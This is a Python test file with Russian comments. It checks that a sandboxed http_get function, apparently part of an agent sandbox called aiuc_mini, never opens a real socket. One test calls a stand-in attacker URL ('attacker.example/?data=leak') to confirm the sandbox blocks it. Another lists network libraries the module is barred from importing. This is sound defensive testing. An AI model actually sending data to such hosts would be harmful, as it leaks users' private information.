"""Гейт Принципа II: http_get не открывает реального сокета (T016)."""

import ast
import socket
from pathlib import Path

import pytest

from aiuc_mini.sandbox.fs import Sandbox
from aiuc_mini.sandbox.http import http_get

pytestmark = pytest.mark.isolation

_HTTP_SRC = Path(__file__).resolve().parents[2] / "src" / "aiuc_mini" / "sandbox" / "http.py"


def test_http_module_does_not_import_network_libs():
    tree = ast.parse(_HTTP_SRC.read_text(encoding="utf-8"))
    imported: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(a.name.split(".")[0] for a in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported.add(node.module.split(".")[0])
    assert {"requests", "httpx", "urllib", "urllib3", "http", "socket"}.isdisjoint(imported)


def test_no_socket_is_opened(monkeypatch):
    """Любой вызов http_get не должен трогать реальный сокет."""

    def _boom(*_a, **_k):
        raise AssertionError("реальное сетевое соединение запрещено в песочнице")

    monkeypatch.setattr(socket.socket, "connect", _boom)
    monkeypatch.setattr(socket, "create_connection", _boom)

    with Sandbox(http_fixtures={"https://known.example": "OK"}) as sb:
        assert http_get("https://known.example", sb).status == 200
        # Внешний URL: 404 + нарушение, но по-прежнему без сокета.
        res = http_get("https://attacker.example/?data=leak", sb)
        assert res.status == 404
        assert res.violation is not None
